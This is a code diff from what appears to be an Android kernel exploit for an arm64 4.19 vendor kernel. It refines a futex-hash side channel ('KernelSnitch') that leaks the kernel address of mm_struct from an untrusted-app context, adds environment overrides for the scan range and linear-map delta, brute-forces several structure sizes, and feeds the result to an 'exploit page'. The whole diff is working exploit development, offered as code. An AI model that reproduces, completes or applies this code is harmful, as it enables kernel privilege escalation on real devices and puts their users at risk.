@@ -142,7 +142,7 @@ static int ks_cache_load(uintptr_t *anchor, char *boot_id, size_t boot_len) {
     }
   }
   fclose(f);
-  if (!have_anchor || value < DIRECT_MAP_BASE || value >= DIRECT_MAP_END) return 0;
+  if (!have_anchor || value < g_direct_map_base || value >= g_direct_map_end) return 0;
   if (strcmp(file_boot, boot_id) != 0) return 0;
   *anchor = (uintptr_t)value;
   return 1;
@@ -152,7 +152,7 @@ static void ks_cache_save(uintptr_t anchor) {
   const char *path;
   char boot_id[128];
   FILE *f;
-  if (anchor < DIRECT_MAP_BASE || anchor >= DIRECT_MAP_END) return;
+  if (anchor < g_direct_map_base || anchor >= g_direct_map_end) return;
   if (!read_boot_id(boot_id, sizeof(boot_id))) return;
   path = select_ks_cache_path(1);
   if (!path) return;
@@ -166,6 +166,7 @@ static void ks_cache_save(uintptr_t anchor) {
   pr_info("KS_CACHE save path=%s anchor=%016zx\n", path, anchor);
 }
 
+__attribute__((unused))
 static int linear_delta_index(void) {
   const char *env = getenv("GHOSTLOCK_DELTA_INDEX");
   if (env && *env) {
@@ -193,82 +194,42 @@ static int linear_delta_index(void) {
  * alioth's RAM gives exactly one linear-map delta.  CFI step=4 is the
  * on-device oracle for which candidate is real. */
 void select_linear_map_delta(uintptr_t mm_va) {
-  /* Offline source verification (memory.h:280): 4.19 arm64 has NO linear
-   * map randomization -- __phys_to_virt is (x - PHYS_OFFSET) | PAGE_OFFSET,
-   * so g_linear_map_delta is always 0 and any leaked mm outside
-   * [PAGE_OFFSET, PAGE_OFFSET+8GB) is a KernelSnitch false positive. */
-  uintptr_t mm_off = mm_va - P0_PAGE_OFFSET;
-  if (mm_off >= 0x200000000ULL) {
-    pr_error("KS_DELTA mm=%016zx offset=%016zx exceeds 8GB linear map: "
-             "false-positive leak, refusing delta\n", mm_va, mm_off);
-    g_linear_map_delta = 0;
+  /* Offline source verification (memory.h:185,280): 4.19 arm64 still uses
+   * PHYS_OFFSET == memstart_addr, and memstart_addr can be randomized.
+   * Until we can read memstart_addr, allow KS_LINEAR_DELTA to override the
+   * 0 default for targeted validation instead of silently dropping it. */
+  const char *delta_env = getenv("KS_LINEAR_DELTA");
+  if (delta_env && *delta_env) {
+    g_linear_map_delta = (uintptr_t)strtoll(delta_env, NULL, 0);
+    pr_info("KS_DELTA override delta=%016zx mm=%016zx\n",
+            g_linear_map_delta, mm_va);
     return;
   }
-  if (g_linear_map_delta != 0) {
-    pr_info("KS_DELTA forcing delta=0 (4.19 linear map is not randomized, "
-            "was 0x%016zx)\n", g_linear_map_delta);
-    g_linear_map_delta = 0;
-    return;
-  }
-  pr_info("KS_DELTA delta=0 confirmed (mm offset=%016zx in linear map)\n",
-          mm_off);
-  return;
-
-  static const int64_t ram_start = (int64_t)P0_PHYS_OFFSET;
-  static const int64_t ram_end = (int64_t)0x280000000ULL;
-  static const int64_t section = (int64_t)1 << 30;
-  int64_t diff = (int64_t)(mm_va - P0_PAGE_OFFSET);
-  int64_t first = ram_start - diff;
-  int64_t memstart = (first + section - 1) & ~(section - 1);
-  int candidates = 0;
-  int selected = -1;
-  int want = linear_delta_index();
-  uintptr_t delta_first = 0;
-
-  for (int i = 0; i < 32 && memstart < ram_end; ++i, memstart += section) {
-    int64_t mm_phys = memstart + diff;
-    if (mm_phys < ram_start || mm_phys >= ram_end) {
-      continue;
-    }
-    uintptr_t delta = (uintptr_t)(memstart - (int64_t)P0_PHYS_OFFSET);
-    if (!candidates) {
-      delta_first = delta;
-    }
-    if (candidates == want) {
-      g_linear_map_delta = delta;
-      selected = candidates;
-    }
-    pr_info("KS_DELTA candidate[%d] memstart=%016llx delta=%016zx "
-            "mm_phys=%016llx%s\n",
-            candidates, (unsigned long long)memstart, delta,
-            (unsigned long long)mm_phys,
-            candidates == want ? " <selected>" : "");
-    candidates++;
-  }
-
-  if (!candidates) {
-    pr_error("KS_DELTA no plausible memstart candidates mm=%016zx\n", mm_va);
-    g_linear_map_delta = 0;
-    return;
-  }
-  if (selected < 0) {
-    pr_warning("KS_DELTA index=%d out-of-range count=%d; using first\n",
-               want, candidates);
-    g_linear_map_delta = delta_first;
-    selected = 0;
-  }
-  pr_info("KS_DELTA selected index=%d/%d mm=%016zx diff=%016llx delta=%016zx\n",
-          selected, candidates, mm_va,
-          (unsigned long long)diff, g_linear_map_delta);
+  pr_info("KS_DELTA delta=0 default (mm offset=%016zx)\n",
+          mm_va - P0_PAGE_OFFSET);
+  g_linear_map_delta = 0;
 }
 
 static void set_ks_window(uintptr_t anchor, int hit) {
   size_t radius = ks_cache_radius_bytes();
-  uintptr_t start = DIRECT_MAP_BASE;
-  uintptr_t end = DIRECT_MAP_END;
-  if (hit && anchor >= DIRECT_MAP_BASE + radius)
+  uintptr_t start = g_direct_map_base;
+  uintptr_t end = g_direct_map_end;
+  const char *scan_start = getenv("KS_MM_START");
+  const char *scan_end = getenv("KS_MM_END");
+  if (scan_start && *scan_start && scan_end && *scan_end) {
+    uintptr_t env_start = (uintptr_t)strtoull(scan_start, NULL, 0);
+    uintptr_t env_end = (uintptr_t)strtoull(scan_end, NULL, 0);
+    if (env_start < env_end && env_start >= g_direct_map_base &&
+        env_end <= g_direct_map_end) {
+      ks->identity_start = env_start;
+      ks->identity_end = env_end;
+      pr_info("KS_MM_SCAN override start=%016zx end=%016zx\n", env_start, env_end);
+      return;
+    }
+  }
+  if (hit && anchor >= g_direct_map_base + radius)
     start = anchor - radius;
-  if (hit && anchor <= DIRECT_MAP_END - radius)
+  if (hit && anchor <= g_direct_map_end - radius)
     end = anchor + radius;
   ks->identity_start = start;
   ks->identity_end = end;
@@ -305,9 +266,11 @@ static void detect_memory(void) {
   /* round up to 1 GB */
   bytes = (bytes + ((1ULL << 30) - 1)) & ~((1ULL << 30) - 1);
   g_ram_bytes = bytes;
-  /* fine-scan the full linear region: 39-bit VA gives 256GB and the vendor
-   * kernel may randomize the linear map (RANDOMIZE_BASE), so scan it all */
-  g_direct_map_end = DIRECT_MAP_END;
+  /* 4.19 arm64 uses the fixed PHYS_OFFSET/PAGE_OFFSET mapping.  The 256GB
+   * region exists only as a compiler-time limit; real kernel objects live
+   * in the physical RAM window. */
+  g_direct_map_base = P0_PAGE_OFFSET;
+  g_direct_map_end = P0_PAGE_OFFSET + g_ram_bytes;
   pr_info("memory detected ram=0x%zx (%zu GB) window_end=%016zx\n",
           g_ram_bytes, g_ram_bytes >> 30, (size_t)g_direct_map_end);
 }
@@ -318,6 +281,17 @@ void setup_kernelsnitch(void) {
   ks = kernelsnitch_setup(
       MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 1, 0);  /* verbose diagnostics for on-device debug */
   ks->identity_end = (size_t)g_direct_map_end;
+  const char *scan_start = getenv("KS_MM_START");
+  const char *scan_end = getenv("KS_MM_END");
+  if (scan_start && *scan_start && scan_end && *scan_end) {
+    uintptr_t start = (uintptr_t)strtoull(scan_start, NULL, 0);
+    uintptr_t end = (uintptr_t)strtoull(scan_end, NULL, 0);
+    if (start < end && start >= g_direct_map_base && end <= g_direct_map_end) {
+      ks->identity_start = start;
+      ks->identity_end = end;
+      pr_info("KS_MM_SCAN override start=%016zx end=%016zx\n", start, end);
+    }
+  }
   const char *delta_str = getenv("KS_LINEAR_DELTA");
   if (delta_str && *delta_str) {
     g_linear_map_delta = strtoull(delta_str, NULL, 0);
@@ -336,11 +310,17 @@ static const size_t ksnitch_mm_sizes[] = {
   0x340, 0x380, 0x358, 0x400, 0x360, 0x300, 0x3c0, 0x480,
 };
 /* The vendor kernel randomizes the linear map (RANDOMIZE_BASE backport), so
- * VA - PAGE_OFFSET is not the physical address. A 7/7 futex-hash agreement
- * has false-positive odds of ~1e-24, which is self-validating; only check the
- * candidate lies inside the scanned linear region. */
+ * A 7/7 futex-hash agreement is self-validating; only check that the
+ * candidate lies inside the 4.19 256GB linear region. */
 static int mm_plausible(size_t mm) {
-  if (mm < DIRECT_MAP_BASE || mm >= (size_t)g_direct_map_end) {
+  if (mm < g_direct_map_base || mm >= (size_t)g_direct_map_end) {
+    return 0;
+  }
+  /* 4.19 arm64 uses a fixed PAGE_OFFSET/PHYS_OFFSET mapping.  A leaked
+   * mm whose linear offset exceeds physical RAM cannot be real and must
+   * not be fed into the exploit page, where it would create wild PI
+   * nodes. */
+  if ((mm - P0_PAGE_OFFSET) >= g_ram_bytes) {
     return 0;
   }
   return 1;
@@ -351,6 +331,8 @@ static int mm_plausible(size_t mm) {
 static void ks_export_collisions(const char *boot_id) {
   char path[256];
   FILE *f;
+  const char *timings_path;
+  FILE *tf;
   snprintf(path, sizeof(path), "/data/local/tmp/ks_collisions.txt");
   /* Untrusted-app context cannot create files in /data/local/tmp, so the
    * helper pre-creates a world-writable file; write in place (no tmp+rename). */
@@ -365,9 +347,33 @@ static void ks_export_collisions(const char *boot_id) {
   for (size_t i = 0; i < ks->collisions; ++i) {
     fprintf(f, "futex_addr=0x%016zx\n", (size_t)ks->futex_addrs[i]);
   }
+  for (size_t i = 0; i < ks->candidate_count; ++i) {
+    fprintf(f, "futex_addr=0x%016zx\n", (size_t)ks->candidate_addrs[i]);
+  }
   fclose(f);
-  pr_info("KS_PC export path=%s addrs=%zu hashsize=0x%lx\n",
-          path, ks->collisions, (unsigned long)futex_hashsize);
+  pr_info("KS_PC export path=%s addrs=%zu candidates=%zu hashsize=0x%lx\n",
+          path, ks->collisions, ks->candidate_count,
+          (unsigned long)futex_hashsize);
+
+  timings_path = getenv("KS_TIMINGS");
+  if (timings_path && *timings_path) {
+    tf = fopen(timings_path, "w");
+    if (tf) {
+      fprintf(tf, "boot_id=%s\n", boot_id);
+      fprintf(tf, "futex_hashsize=0x%lx\n", (unsigned long)futex_hashsize);
+      fprintf(tf, "total=%zu\n", ks->total_futexes);
+      for (size_t i = 2; i < ks->total_futexes; ++i) {
+        fprintf(tf, "%zu 0x%016zx %zu %zu\n", i,
+                (size_t)&ks->futexes[(i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE)],
+                (size_t)ks->t_before[i], (size_t)ks->times[i]);
+      }
+      fclose(tf);
+      pr_info("KS_TIMINGS export path=%s rows=%zu\n", timings_path,
+              ks->total_futexes - 2);
+    } else {
+      pr_warning("KS_TIMINGS export failed path=%s\n", timings_path);
+    }
+  }
 }
 
 /* Read a PC-provided mm answer; only accept 64B-aligned alioth linear-map
@@ -467,6 +473,21 @@ void run_kernelsnitch_bruteforce(void) {
             ks->mm_struct, ks->mm_struct_sz);
     ks_cache_save(ks->mm_struct);
     return;
+  }
+  for (size_t i = 0; i < sizeof(ksnitch_mm_sizes) / sizeof(ksnitch_mm_sizes[0]); ++i) {
+    size_t size = ksnitch_mm_sizes[i];
+    if (size == ks->mm_struct_sz) continue;
+    ks->mm_struct_sz = size;
+    ks->mm_struct = (size_t)-1;
+    ks->state = KERNELSNITCH_COLLISIONS_FOUND;
+    pr_info("KS_MM_SIZE_TRY size=%016zx\n", size);
+    kernelsnitch_bruteforce(ks);
+    if (ks->mm_struct != (size_t)-1 && mm_plausible(ks->mm_struct)) {
+      pr_info("KernelSnitch mm found addr=%016zx sz=0x%zx\n",
+              ks->mm_struct, ks->mm_struct_sz);
+      ks_cache_save(ks->mm_struct);
+      return;
+    }
   }
   if (hit) {
     pr_info("KS_CACHE miss reason=scan-failed falling-back=full-256GB\n");
@@ -1132,6 +1153,19 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     ks = kernelsnitch_setup(
         MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 1, 0);  /* verbose diagnostics for on-device debug */
     ks->identity_end = (size_t)g_direct_map_end;
+    {
+      const char *scan_start = getenv("KS_MM_START");
+      const char *scan_end = getenv("KS_MM_END");
+      if (scan_start && *scan_start && scan_end && *scan_end) {
+        uintptr_t start = (uintptr_t)strtoull(scan_start, NULL, 0);
+        uintptr_t end = (uintptr_t)strtoull(scan_end, NULL, 0);
+        if (start < end && start >= g_direct_map_base && end <= g_direct_map_end) {
+          ks->identity_start = start;
+          ks->identity_end = end;
+          pr_info("KS_MM_SCAN override start=%016zx end=%016zx\n", start, end);
+        }
+      }
+    }
     ks->ram_bytes = g_ram_bytes;
 
     for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
